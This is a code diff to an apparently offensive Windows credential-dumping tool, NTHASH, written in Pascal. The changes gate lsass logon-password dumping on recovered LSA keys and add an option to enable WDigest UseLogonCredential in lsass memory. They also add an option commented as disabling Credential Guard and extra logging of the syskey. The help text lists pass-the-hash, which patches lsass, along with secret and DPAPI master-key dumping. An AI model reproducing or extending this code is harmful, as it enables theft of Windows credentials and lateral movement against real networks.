@@ -374,6 +374,7 @@ begin
   log('patch pos:'+inttostr(patch_pos ),0);
   //
   pattern:=Init_Int_User_Info ;
+  log('Pattern:'+ByteToHexaString (@pattern[0],length(pattern)));
   if search_module_mem (pid,module,pattern,offset)=false then
      begin
      log('search_module_mem NOT OK');
@@ -972,9 +973,10 @@ begin
   log('NTHASH /dumpsecret /input:* [/offline]',1);
   log('NTHASH /dumpsecret /input:a_secret [/offline]',1);
   log('NTHASH /dumpsecret /input:dpapi_system [/offline]',1);
-  log('NTHASH /getlsakeys',1); //will read mem
-  log('NTHASH /wdigest',1);  //will read mem
-  log('NTHASH /logonpasswords',1); //will read mem
+  log('NTHASH /getlsakeys [/symbol]',1); //will read mem
+  log('NTHASH /wdigest [/symbol]',1);  //will read mem
+  log('NTHASH /wdigeston [/symbol]',1);  //will read mem
+  log('NTHASH /logonpasswords [/symbol]',1); //will read mem
   log('NTHASH /pth /user:username /password:myhash /domain:mydomain',1); //will patch lsass
   log('NTHASH /enumcred',1);
   log('NTHASH /enumcred2',1); //will patch lsass
@@ -996,7 +998,7 @@ begin
   log('NTHASH /base64decode /input:base64string',1);
   log('NTHASH /base64decodehexa /input:base64string',1);
   //****************************************************
-  log('NTHASH /dpapimk',1);  //will read mem
+  log('NTHASH /dpapimk [/symbol]',1);  //will read mem
   log('NTHASH /cryptunprotectdata /binary:filename [/hexa]',1);
   log('NTHASH /cryptunprotectdata /input:hexastring [/hexa]',1);
   log('NTHASH /cryptprotectdata /input:string [mode:MACHINE]',1);
@@ -1257,7 +1259,8 @@ if p>0 then
       log('IV:'+ByteToHexaString (iv),1);
       log('DESKey:'+ByteToHexaString (deskey),1);
       log('AESKey:'+ByteToHexaString (aeskey),1);
-      end;
+      end
+      else log('findlsakeys failed',1);
    goto fin;
    end;
 p:=pos('/dpapimk',cmdline);
@@ -1270,18 +1273,29 @@ if p>0 then
 p:=pos('/logonpasswords',cmdline);
 if p>0 then
    begin
-   findlsakeys (lsass_pid,deskey,aeskey,iv );
+   if findlsakeys (lsass_pid,deskey,aeskey,iv )=true
+      then logonpasswords (lsass_pid )
+      else log('findlsakeys failed',1);
    //logonpasswords (lsass_pid,0,'',@callback_LogonPasswords );
-   logonpasswords (lsass_pid );
+
    goto fin;
    end;
-p:=pos('/wdigeston',cmdline);
+p:=pos('/wdigeston2',cmdline); //disable credguard within wdigest
 if p>0 then
    begin
    //symmode :=true;;
-   if wdigest_on  (lsass_pid )
-     then log('wdigest_on OK',1)
-     else log('wdigest_on NOT OK',1);
+   if wdigest_disableCredGuard  (lsass_pid )
+     then log('wdigest_disableCredGuard OK',1)
+     else log('wdigest_disableCredGuard NOT OK',1);
+   exit;
+   end;
+p:=pos('/wdigeston',cmdline); //enable uselogoncredential within wdigest
+if p>0 then
+   begin
+   //symmode :=true;;
+   if wdigest_UseLogonCredential  (lsass_pid )
+     then log('wdigest_UseLogonCredential OK',1)
+     else log('wdigest_UseLogonCredential NOT OK',1);
    exit;
    end;
 p:=pos('/wdigest',cmdline);
@@ -1728,6 +1742,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
         exit;
         end;
      if getsyskey(syskey)=false then begin log('getsyskey NOT OK',1);exit; end;
+     log('syskey:'+ByteToHexaString (syskey));
      //tbal:https://vztekoverflow.com/2018/07/31/tbal-dpapi-backdoor/ & https://twitter.com/gentilkiwi/status/1066830690782797824
      //M$_MSV1_0_TBAL_PRIMARY_{22BE8E5B-58B3-4A87-BA71-41B0ECF3A9EA}
      //
